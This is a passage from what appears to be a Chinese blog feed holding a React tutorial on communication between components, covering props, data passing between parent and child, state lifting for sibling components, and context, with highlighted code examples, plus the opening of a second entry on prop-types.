javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义组件 props包含&#123;name:'jack',age:'20'&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hello</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>接收到数据:&#123;props.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类组件使用-props"><a href="#类组件使用-props" class="headerlink" title="类组件使用 props"></a>类组件使用 props</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 使用组件</span><br><span class="line"><span class="tag">&lt;<span class="name">Hello</span> <span class="attr">name</span>=<span class="string">"jack"</span> <span class="attr">age</span>=<span class="string">"20"</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义组件 props包含&#123;name:'jack',age:'20'&#125;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>接收到的数据:&#123;this.props.age&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="props-注意事项"><a href="#props-注意事项" class="headerlink" title="props 注意事项"></a>props 注意事项</h2><h3 id="什么是单向数据流"><a href="#什么是单向数据流" class="headerlink" title="什么是单向数据流"></a>什么是单向数据流</h3><ul><li>单向数据流，是从上到下的，<code>自顶而下</code>的，数据流。</li><li>好比：河流，瀑布，只能从上往下流动，上游污染下游受影响，但是下游不能影响上游。</li><li>父组件传递数据给子组件，父组件更新数据子组件自动接收更新后数据，但是子组件是不能修改数据的。</li></ul><h3 id="props-可以传递什么数据？"><a href="#props-可以传递什么数据？" class="headerlink" title="props 可以传递什么数据？"></a>props 可以传递什么数据？</h3><ul><li>字符串</li><li>数字</li><li>布尔</li><li>数组</li><li>对象</li><li>函数</li><li>JSX （插槽）</li><li>…任意</li></ul><h2 id="父传子方式"><a href="#父传子方式" class="headerlink" title="父传子方式"></a>父传子方式</h2><p>大致步骤：</p><ul><li>父组件提供要传递的 state 数据</li><li>给子组件标签添加属性，值为 state 中的数据</li><li>子组件中通过 props 接收父组件中传递的数据</li></ul><h3 id="父组件提供要传递的-state-数据"><a href="#父组件提供要传递的-state-数据" class="headerlink" title="父组件提供要传递的 state 数据"></a>父组件提供要传递的 state 数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    money: <span class="number">10000</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;父组件：&#123;<span class="keyword">this</span>.state.money&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="给子组件标签添加属性，值为-state-中的数据"><a href="#给子组件标签添加属性，值为-state-中的数据" class="headerlink" title="给子组件标签添加属性，值为 state 中的数据"></a>给子组件标签添加属性，值为 state 中的数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    money: <span class="number">10000</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;父组件：&#123;<span class="keyword">this</span>.state.money&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">+        &lt;Child money=&#123;this.state.money&#125; /</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="子组件中通过-props-接收父组件中传递的数据"><a href="#子组件中通过-props-接收父组件中传递的数据" class="headerlink" title="子组件中通过 props 接收父组件中传递的数据"></a>子组件中通过 props 接收父组件中传递的数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h3&gt;子组件：&#123;props.money&#125;&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="子传父方式"><a href="#子传父方式" class="headerlink" title="子传父方式"></a>子传父方式</h2><ul><li>父组件提供回调函数，通过 props 传递给子组件</li><li>子组件调用 props 中的回调函数，函数可传参</li><li>父组件函数的参数就是子组件传递的数据</li></ul><h3 id="父组件"><a href="#父组件" class="headerlink" title="父组件"></a>父组件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    money: <span class="number">10000</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 回调函数</span></span><br><span class="line">  buyPhone = <span class="function">(<span class="params">price</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      money: <span class="keyword">this</span>.state.money - price,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; money &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;父组件：&#123;money&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Child money=&#123;money&#125; buyPhone=&#123;this.buyPhone&#125; /</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="子组件"><a href="#子组件" class="headerlink" title="子组件"></a>子组件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Child = <span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 子组件调用父组件传递过来的回调函数</span></span><br><span class="line">    props.buyPhone(<span class="number">5000</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h3&gt;子组件：&#123;props.money&#125;&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;handleClick&#125;&gt;买手机&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><h2 id="兄弟组件通讯"><a href="#兄弟组件通讯" class="headerlink" title="兄弟组件通讯"></a>兄弟组件通讯</h2><blockquote><p>通过状态提升思想完成兄弟组件数据通讯</p></blockquote><p>状态提升思想是什么？</p><ul><li>将共享状态提升到最近的公共父组件中，由公共父组件管理这个状态和修改状态的方法</li><li>需要通讯的组件通过 props 接收状态和函数即可</li></ul><p><img src="https://oss.iyouhun.com/img/md/1638944148017.c33b506e.png" alt="1638944148017.c33b506e"></p><p>参考代码：</p><p><code>index.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 导入两个子组件</span></span><br><span class="line"><span class="keyword">import</span> Jack <span class="keyword">from</span> <span class="string">'./Jack'</span>;</span><br><span class="line"><span class="keyword">import</span> Rose <span class="keyword">from</span> <span class="string">'./Rose'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// App 是父组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 1. 状态提升到父组件</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    msg: <span class="string">''</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  changeMsg = <span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; msg &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;我是App组件&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">        &#123;/</span>* 兄弟组件 <span class="number">1</span> *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">        &lt;Jack changeMsg=&#123;this.changeMsg&#125;&gt;&lt;/</span>Jack&gt;</span><br><span class="line">        &#123;<span class="comment">/* 兄弟组件 2 */</span>&#125;</span><br><span class="line">        &lt;Rose msg=&#123;<span class="keyword">this</span>.state.msg&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Rose</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 渲染组件</span></span><br><span class="line"><span class="regexp">ReactDOM.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><p><code>Jack.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Jack</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  say = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改数据</span></span><br><span class="line">    <span class="keyword">this</span>.props.changeMsg(<span class="string">'you jump i look'</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h3&gt;我是Jack组件&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.say&#125;&gt;说&lt;/</span>button&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><code>Rose.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Rose</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h3&gt;我是Rose组件-&#123;<span class="keyword">this</span>.props.msg&#125;&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="context-跨级组件通讯"><a href="#context-跨级组件通讯" class="headerlink" title="context 跨级组件通讯"></a>context 跨级组件通讯</h2><h3 id="什么是跨级组件通讯？"><a href="#什么是跨级组件通讯？" class="headerlink" title="什么是跨级组件通讯？"></a>什么是跨级组件通讯？</h3><ul><li>组件间相隔多层，理解成叔侄，甚至更远的亲戚。</li></ul><h3 id="context-怎么去理解？"><a href="#context-怎么去理解？" class="headerlink" title="context 怎么去理解？"></a>context 怎么去理解？</h3><ul><li>术语：上下文</li><li>理解：一个范围，只要在这个范围内，就可以跨级组件通讯。（不需要 props 层层传递）</li></ul><p><img src="https://oss.iyouhun.com/img/md/1638932620946.11b91fb0.png" alt="1638932620946.11b91fb0"></p><h3 id="context-使用方法"><a href="#context-使用方法" class="headerlink" title="context 使用方法"></a>context 使用方法</h3><ul><li>创建上下文</li></ul><p><code>context.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext &#125; <span class="keyword">from</span> <span class="string">'react'</span> <span class="comment">// 引入创建上下文的方法</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createContext(初始值) <span class="comment">// 初始值会在找不到Provider提供者时生效</span></span><br></pre></td></tr></table></figure><ul><li>使用上下文的Provider组件作为提供者</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">'./context'</span></span><br><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// Provider包裹确定上下文生效范围，value注入范围内可用的数据</span></span><br><span class="line">  &lt;Context.Provider value=&#123;context共享的值&#125;&gt;</span><br><span class="line">        ....子孙组件</span><br><span class="line">   &lt;<span class="regexp">/Context.Provider&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>使上下文的Consumer作为消费者</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">'./context'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">  &lt;Context.Consumer&gt;</span><br><span class="line">      &#123;</span><br><span class="line">        value =&gt; JSX</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;<span class="regexp">/Context.Consumer&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>示例</li></ul><p><code>index.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component, createContext &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">import</span> Parent <span class="keyword">from</span> <span class="string">'./Parent'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1. 创建上下文对象</span></span><br><span class="line"><span class="comment">// @ts-ignore</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> MyContext = createContext()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    money: <span class="number">10000</span></span><br><span class="line">  &#125;</span><br><span class="line">  updateMoney = <span class="function"><span class="params">newMoney</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      money: newMoney</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="comment">// 2. Provider包裹确定上下文生效范围，value注入范围内可用的数据</span></span><br><span class="line">      &lt;MyContext.Provider value=&#123;&#123;</span><br><span class="line">        money: <span class="keyword">this</span>.state.money,</span><br><span class="line">        updateMoney: <span class="keyword">this</span>.updateMoney</span><br><span class="line">      &#125;&#125;&gt;</span><br><span class="line">        &lt;div className=<span class="string">"app"</span>&gt;</span><br><span class="line">          &lt;h1&gt;根组件：&#123;<span class="keyword">this</span>.state.money&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">          &lt;hr /</span>&gt;</span><br><span class="line">          &lt;Parent /&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>MyContext.Provider&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Parent.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child'</span>;</span><br><span class="line"><span class="keyword">const</span> Parent = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=<span class="string">"parent"</span>&gt;</span><br><span class="line">      &lt;h3&gt;父组件：&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;hr /</span>&gt;</span><br><span class="line">      &lt;Child /&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">export default Parent;</span></span><br></pre></td></tr></table></figure><p><code>Child.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; MyContext &#125; <span class="keyword">from</span> <span class="string">'./App'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> Child = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// 3. 通过Consumer来消费数据，value=&gt;&#123; 这里使用数据 &#125;</span></span><br><span class="line">    &lt;MyContext.Consumer&gt;</span><br><span class="line">      &#123;(value) =&gt; (</span><br><span class="line">        &lt;div className=<span class="string">"child"</span>&gt;</span><br><span class="line">          &lt;h5&gt;子组件：&#123;value.money&#125; &lt;button onClick=&#123;()=&gt;value.updateMoney(<span class="number">5000</span>)&#125;&gt;修改money&lt;<span class="regexp">/button&gt;&lt;/</span>h5&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      )&#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>MyContext.Consumer&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Child;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>使用<code>creatContext()</code>创建一个上下文对象，包含：<code>Provider</code> <code>Consumer</code> 组件。</li><li>使用 <code>Provider</code> 包裹组件，<code>value</code> 属性注入<code>状态，函数</code>，被包裹组件下的任何组件可以使用。</li><li>使用 <code>Consumer</code> 消费 <code>Provider</code> 提供的数据和函数，语法<code>{value=&gt;使用数据和函数}</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;组件通讯-概念&quot;&gt;&lt;a href=&quot;#组件通讯-概念&quot; class=&quot;headerlink&quot; title=&quot;组件通讯-概念&quot;&gt;&lt;/a&gt;组件通讯-概念&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;组件状态是独立的，组件化之后涉及状态同步，需要进行组件通讯&lt;/p&gt;
&lt;/b
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React组件" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6/"/>
    
      <category term="React组件通讯" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF/"/>
    
      <category term="React父子组件传值" scheme="//www.shen.ee/tags/React%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    
      <category term="React兄弟组件传值" scheme="//www.shen.ee/tags/React%E5%85%84%E5%BC%9F%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    
      <category term="组件传值" scheme="//www.shen.ee/tags/%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    
      <category term="父子组件传值" scheme="//www.shen.ee/tags/%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    
      <category term="props" scheme="//www.shen.ee/tags/props/"/>
    
      <category term="context跨级组件通讯" scheme="//www.shen.ee/tags/context%E8%B7%A8%E7%BA%A7%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF/"/>
    
  </entry>
  
  <entry>
    <title>React组件进阶及生命周期</title>
    <link href="//www.shen.ee/article/15749.html"/>
    <id>//www.shen.ee/article/15749.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:25.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="props-类型校验"><a href="#props-类型校验" class="headerlink" title="props - 类型校验"></a>props - 类型校验</h2><ul><li>理解props都是外来的，在使用的时候如果数据类型不对，很容易造成组件内部逻辑出错</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开发者A创建的组件</span></span><br><span class="line"><span class="keyword">const</span> List = <span class="function"><span class="params">props</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> arr = props.colors</span><br><span class="line">  <span class="keyword">const</span> list = arr.map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &lt;li key=&#123;index&#125;&gt;&#123;item.name&#125;&lt;<span class="regexp">/li&gt;)</span></span><br><span class="line"><span class="regexp">return (</span></span><br><span class="line"><span class="regexp">&lt;ul&gt;&#123;list&#125;&lt;/u</span>l&gt;</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开发者B去使用组件</span></span><br><span class="line">&lt;List colors=&#123;<span class="number">19</span>&#125; /&gt;</span><br></pre></td></tr></table></figure><p>报错：<code>TypeError: arr.map is not a function</code></p><ul><li><p>通过 prop-types 可以在创建组件的时候进行类型检查，更合理的使用组件避免错误</p><ul><li><p>安装 <code>yarn add prop-types</code></p></li><li><p>导入 <code>import PropTypes from &#39;prop-types&#39;</code></p></li><li><p>使用 <code>组件名.propTypes = { &#39;props属性&#39;:&#39;props校验规则&#39; }</code> 进行类型约定，<code>PropTypes</code> 包含各种规则</p></li></ul></li></ul><figure class="highlight 